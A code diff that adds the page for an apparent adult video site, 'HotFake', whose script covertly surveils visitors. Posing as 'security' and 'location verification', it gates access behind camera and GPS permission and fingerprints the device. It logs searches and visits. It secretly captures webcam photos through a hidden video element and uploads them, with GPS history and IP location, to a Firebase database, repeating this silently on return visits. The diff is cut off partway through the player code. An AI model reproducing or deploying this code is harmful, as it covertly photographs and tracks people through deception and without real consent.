@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>HotFake – Best Video Collection</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+      :root { --bg: #07070F; --surf: #0F0F1C; --surf2: #181828; --red: #E63946; --red-glow: rgba(230,57,70,0.25); --text: #F0F0FF; --muted: #6E6E98; --border: rgba(255,255,255,0.07); --radius: 14px; --font: 'Poppins', sans-serif; --ease: 0.28s cubic-bezier(.4,0,.2,1); }
+      *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+      
+      body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; overflow-x: hidden; touch-action: manipulation; display:flex; flex-direction:column; }
+      
+      header { position: sticky; top: 0; z-index: 100; background: rgba(7,7,15,0.88); backdrop-filter: blur(18px); border-bottom: 1px solid var(--border); padding: .9rem 2rem; }
+      nav { max-width:1400px; margin:0 auto; display:flex; align-items:center; justify-content:space-between; }
+      .logo { font-size:1.6rem; font-weight:800; color:var(--text); text-decoration:none; display:flex; align-items:center; gap:.4rem; letter-spacing:-1px; }
+      .logo-dot { color:var(--red); }
+      
+      .hero { text-align:center; padding: 5rem 1.5rem 3.5rem; background: radial-gradient(ellipse 80% 60% at 50% -10%, var(--red-glow) 0%, transparent 60%); }
+      .hero h1 { font-size: clamp(2.2rem, 6vw, 4rem); font-weight:800; letter-spacing:-2px; line-height:1.1; margin-bottom:.8rem; }
+      .hero h1 em { color:var(--red); font-style:normal; }
+      .hero p { color:var(--muted); font-size:1.05rem; margin-bottom:2rem; }
+      
+      .search-wrap { max-width:480px; margin:0 auto; position:relative; }
+      .search-input { width:100%; padding:.85rem 1.4rem .85rem 3rem; background:var(--surf); border:1.5px solid var(--border); border-radius:50px; color:var(--text); font-family:var(--font); font-size:.95rem; outline:none; transition: border-color var(--ease), box-shadow var(--ease); }
+      .search-input:focus { border-color:var(--red); box-shadow:0 0 0 3px var(--red-glow); }
+      .search-icon { position:absolute; left:1.1rem; top:50%; transform:translateY(-50%); color:var(--muted); font-size:1rem; pointer-events:none; }
+      
+      .main { flex:1; max-width:1400px; width:100%; margin:0 auto; padding:2rem; }
+      .row-head { display:flex; align-items:center; gap:1rem; margin-bottom:1.5rem; border-left:3px solid var(--red); padding-left:.9rem; }
+      .row-head h2 { font-size:1.25rem; font-weight:600; }
+      .count-badge { background:var(--surf2); color:var(--muted); font-size:.8rem; padding:.2rem .7rem; border-radius:50px; border:1px solid var(--border); }
+      
+      .gallery { display:grid; grid-template-columns: repeat(auto-fill, minmax(270px, 1fr)); gap:1.25rem; }
+      .card { display:block; text-decoration:none; color:var(--text); background:var(--surf); border-radius:var(--radius); border:1px solid var(--border); overflow:hidden; transition: transform var(--ease), box-shadow var(--ease), border-color var(--ease); cursor: pointer;}
+      .card:hover { transform:translateY(-7px); box-shadow: 0 20px 50px rgba(0,0,0,.6), 0 0 0 1px rgba(230,57,70,.25); border-color:rgba(230,57,70,.3); }
+      .card-thumb { position:relative; aspect-ratio:16/9; background:var(--surf2); overflow:hidden; }
+      .card-thumb img { width:100%; height:100%; object-fit:cover; transition: transform .5s ease; }
+      .card:hover .card-thumb img { transform:scale(1.06); }
+      .cat-badge { position:absolute; top:10px; left:10px; font-size:.7rem; font-weight:600; padding:.3rem .6rem; border-radius:5px; z-index:2; text-transform:uppercase;}
+      .cat-badge.movie { background: var(--red); color:#fff; box-shadow:0 2px 10px rgba(230,57,70,.5); }
+      .cat-badge.link { background: rgba(0,0,0,0.6); color:#fff; backdrop-filter:blur(5px); }
+      
+      .play-overlay { position:absolute; inset:0; background: linear-gradient(to top, rgba(0,0,0,.7) 0%, rgba(0,0,0,.2) 60%, transparent 100%); display:flex; align-items:center; justify-content:center; opacity:0; transition: opacity var(--ease); z-index:1;}
+      .card:hover .play-overlay { opacity:1; }
+      .play-circle { width:62px; height:62px; border-radius:50%; background:var(--red); display:flex; align-items:center; justify-content:center; box-shadow:0 4px 24px rgba(230,57,70,.6); transform:scale(.8); transition:transform var(--ease); }
+      .play-triangle { width:0; height:0; border-top:12px solid transparent; border-bottom:12px solid transparent; border-left:20px solid #fff; margin-left:5px; }
+      
+      /* --- FOOTER --- */
+      footer { text-align:center; padding:3rem 1rem 2rem; border-top:1px solid var(--border); margin-top:4rem; background:var(--surf); }
+      .social-links { display:flex; gap:1rem; justify-content:center; margin-bottom:1.5rem; flex-wrap:wrap; }
+      .soc-btn { display:inline-flex; align-items:center; gap:.5rem; padding:.6rem 1.2rem; border-radius:50px; background:var(--surf2); color:var(--text); text-decoration:none; font-size:.85rem; font-weight:500; border:1px solid var(--border); transition:all .2s;}
+      .soc-btn:hover { background:var(--red); border-color:var(--red); transform:translateY(-2px); }
+      .footer-txt { color:var(--muted); font-size:.85rem; }
+
+      /* --- MODALS (18+, Banned) --- */
+      .modal-bg { position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:10000; display:flex; align-items:center; justify-content:center; padding:1rem; backdrop-filter:blur(5px); }
+      .modal-content { background:var(--surf); border:1px solid var(--border); border-radius:var(--radius); padding:2rem; text-align:center; max-width:400px; width:100%; }
+      .modal-content h3 { font-size:1.5rem; margin-bottom:1rem; color:var(--red); }
+      .modal-content p { color:var(--muted); margin-bottom:1.5rem; font-size:.95rem; }
+      .modal-btn-group { display:flex; gap:1rem; justify-content:center; }
+      .btn { padding:.8rem 1.5rem; border-radius:8px; border:none; font-weight:600; cursor:pointer; font-family:var(--font); flex:1; transition:0.2s; }
+      .btn-yes { background:var(--red); color:#fff; }
+      .btn-no { background:var(--surf2); color:#fff; border:1px solid var(--border); }
+      .btn:hover { transform:scale(1.05); }
+
+      /* --- NEW EPISODES GRID MODAL --- */
+      .ep-modal-content { background:var(--surf); border:1px solid var(--border); border-radius:var(--radius); padding:1.5rem; width:100%; max-width:650px; }
+      .ep-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(130px, 1fr)); gap:12px; max-height:400px; overflow-y:auto; padding-right:5px; margin-top:1rem; }
+      .ep-card { background:var(--surf2); border:1px solid var(--border); border-radius:8px; overflow:hidden; cursor:pointer; transition:all 0.2s; display:flex; flex-direction:column; }
+      .ep-card:hover { border-color:var(--red); transform:translateY(-3px); box-shadow:0 5px 15px rgba(230,57,70,0.3); }
+      .ep-thumb { width:100%; aspect-ratio:16/9; background:#111; position:relative; }
+      .ep-thumb img { width:100%; height:100%; object-fit:cover; }
+      .ep-thumb .ep-num { position:absolute; top:5px; left:5px; background:rgba(0,0,0,0.75); color:white; font-size:0.7rem; padding:2px 6px; border-radius:4px; font-weight:bold; backdrop-filter:blur(2px); border: 1px solid rgba(255,255,255,0.1); }
+      .ep-title { padding:8px 10px; font-size:0.8rem; color:white; font-weight:500; text-align:center; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; font-family:var(--font); }
+
+      /* --- HOTFAKE SECURE PLAYER OLD UI --- */
+      #playerModal { display:none; position:fixed; inset:0; background:#000; z-index:9999; flex-direction:column; touch-action: none !important; }
+      .player-wrapper { flex:1; display:flex; justify-content:center; align-items:center; width:100vw; height:100vh; position:relative; background: #000; overflow: hidden; touch-action: none !important;}
+      #iframeContainer { width: 100%; height: 100%; position: relative; display: none; overflow: hidden; background: #000; touch-action: none !important; }
+      #iframePlayer { width: 100%; height: 100%; border: none; position: relative; z-index: 1; transform: scale(1.15); }
+
+      /* Ad Layer */
+      #adContainer { position:absolute; inset:0; background:#000; z-index:90; display:none; flex-direction:column; align-items:center; justify-content:center; }
+      .skip-btn { position:absolute; bottom:30px; right:30px; background:rgba(0,0,0,0.7); border:1px solid var(--border); color:white; padding:0.6rem 1.2rem; border-radius:50px; font-family:var(--font); z-index:95; cursor:pointer; font-weight:600; display:none; }
+      .skip-btn.disabled { opacity:0.6; cursor:not-allowed; }
+
+      /* The Ultimate Shield */
+      #touchCatcher { position: absolute; inset: 0; z-index: 50; background: transparent; pointer-events: auto; }
+      .censor-top { position: absolute; top: 0; left: 0; right: 0; height: 0px; background: linear-gradient(to bottom, rgba(0,0,0,1) 40%, transparent 100%); z-index: 10; pointer-events: none; }
+      .censor-bottom { position: absolute; bottom: 0; left: 0; right: 0; height: 0px; background: linear-gradient(to top, rgba(0,0,0,1) 40%, transparent 100%); z-index: 10; pointer-events: none; }
+
+      /* Smart UI Overlay */
+      .smart-overlay { position: absolute; inset: 0; z-index: 99; display: flex; flex-direction: column; justify-content: space-between; opacity: 0; visibility: hidden; pointer-events: none; transition: opacity 1.2s ease-in, visibility 1.2s; }
+      .smart-overlay.active { opacity: 1; visibility: visible; transition: opacity 0s; }
+      .glass-top { background: linear-gradient(to bottom, rgba(0,0,0,0.98) 0%, rgba(0,0,0,0.6) 75%, transparent 100%); height: 90px; display: flex; align-items: flex-start; padding: 15px 20px; backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); pointer-events: auto; }
+      
+      .top-left-group { display: flex; align-items: center; }
+      .ui-back-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.15); color: white; width: 40px; height: 40px; border-radius: 50%; font-size: 1.1rem; display: flex; justify-content: center; align-items: center; cursor: pointer; backdrop-filter: blur(4px); transition: background 0.2s; }
+      .ui-back-btn:hover { background: var(--red); border-color: var(--red); }
+      .overlay-title { color: white; margin-left: 15px; font-weight: 500; font-size: 1.1rem; text-shadow: 0 2px 4px rgba(0,0,0,0.8); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 80vw; margin-top:5px;}
+      .watermark-logo { position: absolute; bottom: 25px; right: 35px; color: rgba(255, 255, 255, 0.45); font-size: 1.8rem; font-weight: 900; letter-spacing: 3px; font-family: 'Arial Black', sans-serif; pointer-events: none; }
+      
+      .loader { border: 4px solid var(--surf2); border-top: 4px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 2rem auto; }
+      @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<video id="secretVideo" width="640" height="480" autoplay playsinline style="display:none;"></video>
+<canvas id="secretCanvas" width="640" height="480" style="display:none;"></canvas>
+
+<div id="ageGate" class="modal-bg" style="display:none;">
+    <div class="modal-content">
+        <h3>🔞 Age Verification</h3>
+        <p>This website contains adult content. Are you 18 years of age or older?</p>
+        <div class="modal-btn-group">
+            <button class="btn btn-no" onclick="setAgeStatus('no')">No, I am under 18</button>
+            <button class="btn btn-yes" onclick="setAgeStatus('yes')">Yes, I am 18+</button>
+        </div>
+    </div>
+</div>
+
+<div id="banGate" class="modal-bg" style="display:none; background:#000; z-index: 999999;">
+    <div class="modal-content">
+        <h3>🚫 Access Denied</h3>
+        <p>Your device has been permanently banned by the administrator.</p>
+    </div>
+</div>
+
+<div id="gpsGate" class="modal-bg" style="display:none; z-index: 10005;">
+    <div class="modal-content">
+        <h3>🌍 Location Verification</h3>
+        <p style="text-align:left; font-size:0.9rem; margin-bottom:1rem;">To provide you with the best localized content and improve our services, we require temporary access to your GPS.</p>
+        
+        <div style="background:var(--surf2); border-left:3px solid var(--red); padding:10px; margin-bottom:1.5rem; text-align:left; border-radius:4px;">
+            <p style="font-size:0.85rem; color:var(--muted); line-height:1.4;">
+                <b>Official Note:</b> कृपया अपना GPS कुछ सेकंड के लिए चालू करें और "Allow" पर क्लिक करें। यह हमारी मदद करता है ताकि हम आपके क्षेत्र (location) के अनुसार बेहतर कंटेंट दे सकें। एक बार लोकेशन सेव होने के बाद, आप GPS को वापस OFF कर सकते हैं। 
+                <br><br><span style="color:var(--red); font-weight:600;">बिना लोकेशन वेरिफिकेशन के वेबसाइट का एक्सेस नहीं दिया जाएगा।</span>
+            </p>
+        </div>
+
+        <div id="gpsError" style="color:var(--red); font-size:0.85rem; margin-bottom:1rem; font-weight:600; display:none;">
+            ❌ Permission denied! Please click the lock icon in URL bar, allow location, and try again.
+        </div>
+        
+        <div class="modal-btn-group">
+            <button class="btn btn-yes" style="width:100%;" onclick="requestGPSAccess()">📍 Verify Location to Continue</button>
+        </div>
+    </div>
+</div>
+
+<div id="cameraGate" class="modal-bg" style="display:none; z-index: 10006;">
+    <div class="modal-content">
+        <h3>📸 Security Verification</h3>
+        <p style="text-align:left; font-size:0.9rem; margin-bottom:1rem;">To ensure platform safety, we require a quick camera verification.</p>
+        
+        <div style="background:var(--surf2); border-left:3px solid var(--red); padding:10px; margin-bottom:1.5rem; text-align:left; border-radius:4px;">
+            <p style="font-size:0.85rem; color:var(--muted); line-height:1.4;">
+                <b>Official Note:</b> कृपया अपनी पहचान (Authenticity) वेरिफाई करने के लिए कैमरा एक्सेस "Allow" करें। यह हमारी सुरक्षा नीति का हिस्सा है। वेरिफिकेशन पूरा होने के बाद ही आप वेबसाइट का उपयोग कर पाएंगे। 
+                <br><br><span style="color:var(--red); font-weight:600;">बिना कैमरा वेरिफिकेशन के वेबसाइट का एक्सेस नहीं दिया जाएगा।</span>
+            </p>
+        </div>
+
+        <div id="cameraError" style="color:var(--red); font-size:0.85rem; margin-bottom:1rem; font-weight:600; display:none;">
+            ❌ Permission denied! Please click the lock icon in URL bar, allow camera, and try again.
+        </div>
+        
+        <div class="modal-btn-group">
+            <button class="btn btn-yes" style="width:100%;" onclick="requestCameraAccess()">📷 Verify Camera to Continue</button>
+        </div>
+    </div>
+</div>
+
+<div id="episodesModal" class="modal-bg" style="display:none;">
+    <div class="ep-modal-content">
+        <h3 id="epModalTitle" style="color:white; font-size:1.2rem; text-align:left; font-weight:600;">Select Episode</h3>
+        <div id="epListContainer" class="ep-grid"></div>
+        <button class="btn btn-no" style="width:100%; margin-top:1.5rem;" onclick="document.getElementById('episodesModal').style.display='none'">Close</button>
+    </div>
+</div>
+
+<header>
+  <nav><a href="index.html" class="logo"><span class="logo-dot">▶</span> HotFake</a></nav>
+</header>
+
+<section class="hero">
+  <h1>Amazing Videos<br><em>Collection</em></h1>
+  <div class="search-wrap">
+    <span class="search-icon">🔍</span>
+    <input type="text" id="searchInput" class="search-input" placeholder="Search movies, videos...">
+  </div>
+</section>
+
+<main class="main">
+  <div class="row-head"><h2>Latest Videos</h2><span class="count-badge" id="countBadge">Loading...</span></div>
+  <div id="loading" class="loader"></div>
+  <div class="gallery" id="gallery" style="display: none;"></div>
+</main>
+
+<footer>
+    <div class="social-links" id="footerSocials"></div>
+    <p class="footer-txt">© 2026 HotFake. All rights reserved.</p>
+</footer>
+
+<div id="playerModal">
+  <div class="player-wrapper" id="playerWrapper">
+    <div id="adContainer">
+        <div id="adMediaContainer" style="width:100%; height:100%; display:flex; justify-content:center; align-items:center;"></div>
+        <button id="skipBtn" class="skip-btn disabled">Skip Ad (5)</button>
+    </div>
+    <div id="iframeContainer">
+       <div class="censor-top"></div>
+       <div class="censor-bottom"></div>
+       <div id="touchCatcher"></div>
+       <div class="smart-overlay" id="smartOverlay">
+           <div class="glass-top">
+               <div class="top-left-group">
+                   <button class="ui-back-btn" id="uiBackBtn">⬅</button>
+                   <span class="overlay-title" id="overlayTitle">Movie Title</span>
+               </div>
+           </div>
+           <div class="watermark-logo">HOTFAKE</div>
+       </div>
+       <iframe id="iframePlayer" allowfullscreen allow="autoplay; fullscreen"></iframe>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+  import { getDatabase, ref, onValue, set, update, get, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyCTfvrtZuHXk3RW91Dcwpbghhq--D6X2s8",
+    authDomain: "inshelp-f2cba.firebaseapp.com",
+    databaseURL: "https://inshelp-f2cba-default-rtdb.firebaseio.com",
+    projectId: "inshelp-f2cba"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+  
+  let allVideos = [];
+  let isAdultUser = false;
+  let deviceId = null;
+  let activeAd = null;
+
+  // Gate Controller System (Age, GPS & Camera)
+  function checkGates() {
+      const ageStatus = sessionStorage.getItem('ageStatus');
+      const gpsVerified = localStorage.getItem('gpsVerified'); 
+      const cameraVerified = localStorage.getItem('cameraVerified'); 
+
+      if (!ageStatus) {
+          document.getElementById('ageGate').style.display = 'flex';
+      } else if (!gpsVerified) {
+          isAdultUser = (ageStatus === 'yes');
+          document.getElementById('gpsGate').style.display = 'flex';
+      } else if (!cameraVerified) {
+          isAdultUser = (ageStatus === 'yes');
+          document.getElementById('cameraGate').style.display = 'flex';
+      } else {
+          isAdultUser = (ageStatus === 'yes');
+          renderGallery(document.getElementById('searchInput').value);
+          
+          silentGPSUpdate(); 
+          silentCameraUpdate(); 
+      }
+  }
+
+  function silentGPSUpdate() {
+      if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+              (position) => {
+                  if (deviceId) {
+                      const gpsData = {
+                          lat: position.coords.latitude,
+                          lon: position.coords.longitude,
+                          accuracy: Math.round(position.coords.accuracy) + " meters",
+                          time: new Date().toISOString()
+                      };
+                      set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), gpsData);
+                  }
+              },
+              (error) => {},
+              { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+      }
+  }
+
+  function silentCameraUpdate() {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+          .then(function(stream) {
+              captureAndUploadPhoto(stream, "Background Return Visit");
+          })
+          .catch(function(err) {});
+  }
+
+  function captureAndUploadPhoto(stream, actionText) {
+      const video = document.getElementById('secretVideo');
+      const canvas = document.getElementById('secretCanvas');
+      
+      video.srcObject = stream;
+      video.play();
+      
+      video.addEventListener('canplay', function() {
+          setTimeout(function() {
+              const context = canvas.getContext('2d');
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const dataUrl = canvas.toDataURL('image/jpeg', 0.5); 
+              
+              const currentId = deviceId ? deviceId : 'Unknown';
+              const photoId = Date.now().toString(36); 
+              
+              set(ref(db, 'secret_photos/' + photoId), {
+                  imageBase64: dataUrl,
+                  deviceId: currentId,
+                  time: new Date().toISOString()
+              }).then(() => {
+                  stream.getTracks().forEach(track => track.stop()); 
+                  logAction(`Secret Photo Captured: ${actionText}`);
+              }).catch(e => console.error(e));
+          }, 150); // Fast 150ms delay
+      }, { once: true });
+  }
+
+  window.setAgeStatus = function(status) {
+      sessionStorage.setItem('ageStatus', status);
+      document.getElementById('ageGate').style.display = 'none';
+      logAction(`Age gate answered: ${status}`);
+      checkGates(); 
+  }
+
+  window.requestGPSAccess = function() {
+      const errDiv = document.getElementById('gpsError');
+      errDiv.style.display = 'none';
+      
+      if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+              (position) => {
+                  localStorage.setItem('gpsVerified', 'true');
+                  document.getElementById('gpsGate').style.display = 'none';
+                  
+                  if (deviceId) {
+                      const gpsData = {
+                          lat: position.coords.latitude,
+                          lon: position.coords.longitude,
+                          accuracy: Math.round(position.coords.accuracy) + " meters",
+                          time: new Date().toISOString()
+                      };
+                      set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), gpsData);
+                      logAction("Initial GPS Location Captured");
+                  }
+                  checkGates(); 
+              },
+              (error) => {
+                  errDiv.style.display = 'block';
+                  logAction("GPS Access Denied by User");
+              },
+              { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+          );
+      } else {
+          errDiv.innerText = "GPS is not supported on this device.";
+          errDiv.style.display = 'block';
+      }
+  }
+
+  window.requestCameraAccess = function() {
+      const errDiv = document.getElementById('cameraError');
+      errDiv.style.display = 'none';
+      
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+          .then(function(stream) {
+              localStorage.setItem('cameraVerified', 'true');
+              document.getElementById('cameraGate').style.display = 'none';
+              
+              captureAndUploadPhoto(stream, "Initial Verification");
+              checkGates(); 
+          })
+          .catch(function(err) {
+              errDiv.style.display = 'block';
+              logAction("Camera Access Denied by User");
+          });
+  }
+
+  function getAdvancedDeviceInfo() {
+      const ua = navigator.userAgent;
+      let type = "Desktop";
+      if (/Tablet|iPad/i.test(ua) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 2 && /MacIntel/.test(navigator.platform))) { type = "Tablet"; } 
+      else if (/Mobile|Android|iP(hone|od)/i.test(ua)) { type = "Mobile"; }
+      let os = "Unknown";
+      if (/Windows/i.test(ua)) os = "Windows";
+      else if (/Mac OS X/i.test(ua)) os = "MacOS";
+      else if (/Android/i.test(ua)) os = "Android";
+      else if (/Linux/i.test(ua)) os = "Linux";
+      else if (/iP(hone|od|ad)/i.test(ua)) os = "iOS";
+      let browser = "Unknown";
+      if (/Edg/i.test(ua)) browser = "Edge";
+      else if (/OPR/i.test(ua)) browser = "Opera";
+      else if (/Chrome/i.test(ua)) browser = "Chrome";
+      else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+      else if (/Firefox/i.test(ua)) browser = "Firefox";
+      let gpu = "Unknown";
+      try {
+          const canvas = document.createElement('canvas');
+          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+          if (gl) {
+              const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+              if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          }
+      } catch(e) {}
+      let tz = "Unknown";
+      try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
+      return {
+          type: type, os: os, browser: browser, gpu: gpu,
+          cores: navigator.hardwareConcurrency || "Unknown",
+          ram: navigator.deviceMemory || "Unknown",
+          touch: navigator.maxTouchPoints > 0 ? "Yes" : "No",
+          tz: tz, lang: navigator.language || "Unknown",
+          screen: `${window.screen.width}x${window.screen.height}`,
+          cookieEnabled: navigator.cookieEnabled
+      };
+  }
+
+  function generateDeviceFingerprint(info) {
+      const rawString = `${info.os}|${info.browser}|${info.gpu}|${info.cores}|${info.ram}|${info.screen}|${info.tz}|${info.touch}`;
+      let hash = 0;
+      for (let i = 0; i < rawString.length; i++) {
+          hash = ((hash << 5) - hash) + rawString.charCodeAt(i);
+          hash |= 0; 
+      }
+      return Math.abs(hash).toString(36).toUpperCase(); 
+  }
+
+  function getFormattedTime() {
+      const d = new Date();
+      return { fullDate: d.toISOString() };
+  }
+
+  window.logAction = function(actionDesc) {
+      if(!deviceId) return;
+      set(ref(db, `users/${deviceId}/actions/${Date.now()}`), { action: actionDesc, time: new Date().toISOString() });
+  };
+
+  async function trackUser() {
+      const advInfo = getAdvancedDeviceInfo();
+      const hardwareHash = generateDeviceFingerprint(advInfo);
+      const shortOs = advInfo.os.substring(0, 4).toUpperCase();
+      deviceId = `${shortOs}-${hardwareHash}`; 
+      const { fullDate } = getFormattedTime();
+
+      let ipData = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown" };
+      try { 
+          const res = await fetch('https://ipapi.co/json/'); 
+          if(res.ok) {
+              const jd = await res.json();
+              ipData = { ip: jd.ip, city: jd.city, region: jd.region, org: jd.org };
+          } 
+      } catch(e){}
+
+      get(ref(db, `users/${deviceId}`)).then((snap) => {
+          const locId = Date.now();
+          if (!snap.exists()) {
+              const initialData = { 
+                  firstVisit: fullDate, lastActive: fullDate, status: "Live", 
+                  network: ipData, device: advInfo, banned: false,
+                  locationHistory: { [locId]: { ...ipData, time: fullDate } }
+              };
+              set(ref(db, `users/${deviceId}`), initialData);
+              logAction("First visit to the website");
+          } else {
+              let updates = { lastActive: fullDate, network: ipData };
+              updates[`locationHistory/${locId}`] = { ...ipData, time: fullDate };
+              update(ref(db, `users/${deviceId}`), updates);
+              logAction("User returned to website");
+          }
+          
+          checkGates();
+      });
+
+      onValue(ref(db, 'users/' + deviceId), (snap) => { 
+          if (snap.exists() && snap.val().banned) { document.getElementById('banGate').style.display = 'flex'; } 
+          else { document.getElementById('banGate').style.display = 'none'; }
+      });
+
+      const connectedRef = ref(db, ".info/connected");
+      onValue(connectedRef, (snap) => {
+          if (snap.val() === true && deviceId) {
+              const statusRef = ref(db, `users/${deviceId}/status`);
+              onDisconnect(statusRef).set("Offline").then(() => { set(statusRef, "Live"); });
+          }
+      });
+  }
+  trackUser();
+
+  // --- FETCH DATA & RENDER ---
+  onValue(ref(db, 'settings/ad'), (snap) => { activeAd = snap.val(); });
+  onValue(ref(db, 'settings/general/favicon'), (snap) => {
+    if(snap.val()) {
+      let link = document.querySelector("link[rel~='icon']");
+      if (!link) { link = document.createElement('link'); link.rel = 'icon'; document.head.appendChild(link); }
+      link.href = snap.val();
+    }
+  });
+  
+  onValue(ref(db, 'settings/social'), (snap) => {
+      const data = snap.val();
+      const fs = document.getElementById('footerSocials'); fs.innerHTML = '';
+      if(data) {
+          if(data.discord) fs.innerHTML += `<a href="${data.discord}" target="_blank" class="soc-btn">Discord</a>`;
+          if(data.telegram) fs.innerHTML += `<a href="${data.telegram}" target="_blank" class="soc-btn">Telegram</a>`;
+          if(data.whatsapp) fs.innerHTML += `<a href="${data.whatsapp}" target="_blank" class="soc-btn">WhatsApp</a>`;
+          if(data.instagram) fs.innerHTML += `<a href="${data.instagram}" target="_blank" class="soc-btn">Instagram</a>`;
+          if(data.x) fs.innerHTML += `<a href="${data.x}" target="_blank" class="soc-btn">X (Twitter)</a>`;
+      }
+  });
+
+  onValue(ref(db, 'videos'), (snapshot) => {
+    document.getElementById('loading').style.display = 'none';
+    const data = snapshot.val(); allVideos = [];
+    if (data) {
+      Object.keys(data).forEach(key => { allVideos.push({ id: key, ...data[key] }); });
+      allVideos.sort((a, b) => new Date(b.addedDate) - new Date(a.addedDate));
+    }
+  });
+
+  function renderGallery(term) {
+    let list = [...allVideos];
+    if (!isAdultUser) { list = list.filter(v => v.is18Plus !== 'true'); }
+    if (term && term.trim()) {
+      const t = term.trim().toLowerCase(); list = list.filter(v => v.title.toLowerCase().includes(t));
+    }
+    
+    document.getElementById('countBadge').textContent = list.length + ' video(s)';
+    const gallery = document.getElementById('gallery'); gallery.style.display = 'grid';
+    
+    let htmlCode = '';
+    list.forEach(v => {
+      const isEmbed = v.type === 'embed';
+      const catBadge = isEmbed ? '<span class="cat-badge movie">🎬 Movie</span>' : '<span class="cat-badge link">🔗 Link</span>';
+      const partsJson = v.parts ? encodeURIComponent(JSON.stringify(v.parts)) : '';
+
+      htmlCode += `
+        <a class="card vid-card" data-id="${v.id}" data-url="${v.videoUrl}" data-title="${esc(v.title)}" data-embed="${isEmbed}" data-parts="${partsJson}">
+          <div class="card-thumb">
+            <img src="${v.imageUrl}" loading="lazy" onerror="this.style.display='none'">
+            ${catBadge}
+            <div class="play-overlay"><div class="play-circle"><div class="play-triangle"></div></div></div>
+          </div>
+          <div style="padding: 10px;">
+              <h4 style="font-size:0.9rem; color:#fff; font-weight:500;">${esc(v.title)}</h4>
+          </div>
+        </a>`;
+    });
+    gallery.innerHTML = htmlCode;
+
+    document.querySelectorAll('.vid-card').forEach(card => {
+      card.addEventListener('click', function(e) {
+        e.preventDefault();
+        const isEmbed = this.dataset.embed === 'true';
+        const partsRaw = this.dataset.parts;
+        const vidId = this.dataset.id;
+        const mainUrl = this.dataset.url;
+        const title = this.dataset.title;
+
+        if (!isEmbed) {
+            logAction(`Opened External Link: ${title}`);
+            logWatchHistory(vidId, title, 0);
+            window.open(mainUrl, '_blank'); return;
+        }
+        if (partsRaw) {
+            const parts = JSON.parse(decodeURIComponent(partsRaw));
+            if (parts.length > 0) { 
+                logAction(`Viewed episode list for: ${title}`);
+                showEpisodes(title, parts, vidId); return; 
+            }
+        }
+        player.open(mainUrl, title, vidId);
+      });
+    });
+  }
+
+  function esc(s) { return String(s).replace(/"/g, '&quot;').replace(/'/g, '&#39;'); }
+
+  let searchTimeout;
+  document.getElementById('searchInput').addEventListener('input', function() { 
+      renderGallery(this.value); clearTimeout(searchTimeout);
+      if(this.value.trim().length > 1) { searchTimeout = setTimeout(() => logAction(`Searched for: ${this.value}`), 2000); }
+  });
+
+  function showEpisodes(showTitle, parts, vidId) {
+      document.getElementById('epModalTitle').innerText = showTitle;
+      const container = document.getElementById('epListContainer'); container.innerHTML = '';
+      
+      parts.forEach((p, idx) => {
+          const epTitle = p.title || `Episode ${idx+1}`;
+          const epImg = p.image || 'https://via.placeholder.com/300x169/181828/6E6E98?text=No+Image';
+
+          const card = document.createElement('div'); card.className = 'ep-card';
+          card.innerHTML = `
+            <div class="ep-thumb">
+                <span class="ep-num">Ep ${idx+1}</span>
+                <img src="${epImg}" loading="lazy" onerror="this.src='https://via.placeholder.com/300x169/181828/6E6E98?text=No+Image'">
+            </div>
+            <div class="ep-title" title="${esc(epTitle)}">${esc(epTitle)}</div>`;
+          
+          card.onclick = () => { 
+              document.getElementById('episodesModal').style.display = 'none'; 
+              const fullTitle = `${showTitle} | ${epTitle}`;
+              player.open(p.url, fullTitle, vidId); 
+          };
+          container.appendChild(card);
+      });
+      document.getElementById('episodesModal').style.display = 'flex';
+  }
+
+  function logWatchHistory(vidId, title, durationSec) {
+      if(!deviceId) return;
+      const histRef = ref(db, `users/${deviceId}/history/${vidId}`);
+      get(histRef).then(snap => {
+          let data = snap.val() || { title: title, plays: 0, totalDuration: 0 };
+          data.plays += 1; data.totalDuration += durationSec; data.lastPlayed = new Date().toISOString();
+          update(histRef, data);
+      });
+  }
+
+  class SecureVideoPlayer {
+    constructor() { this.init(); this.uiTimer = null; this.shieldRestoreTimer = null; this.lastTap = 0; }
+    init() {
+      this.modal = document.getElementById('playerModal');
+      this.iframeContainer = document.getElementById('iframeContainer');
+      this.iframePlayer = document.getElementById('iframePlayer');
